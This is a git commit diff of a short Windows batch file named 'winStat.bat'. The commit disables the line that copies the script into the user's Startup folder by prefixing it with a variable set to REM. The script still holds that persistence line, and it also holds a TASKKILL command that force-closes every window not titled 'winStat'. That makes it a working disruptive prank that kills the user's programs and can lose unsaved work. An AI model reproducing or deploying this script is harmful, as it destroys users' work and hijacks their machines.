6654fc10b6ca97365782435b030046c8e2bfd3b1
zacharyacutey <zacharyacutey@users.noreply.github.com>
2016-02-25 15:17:27 -0500

    Update winStat.bat

--- winStat.bat
+++ winStat.bat
@@ -1,8 +1,9 @@
 @ECHO OFF
 COLOR 0A
+SET C=REM
 ::I was hoping to not have it copy itself into the startup folder because of some... accidents I have had, but whatever. XD
 IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
-COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
+%C% COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
 )
 TITLE winStat
 TASKKILL /F /FI "WINDOWTITLE ne winStat"
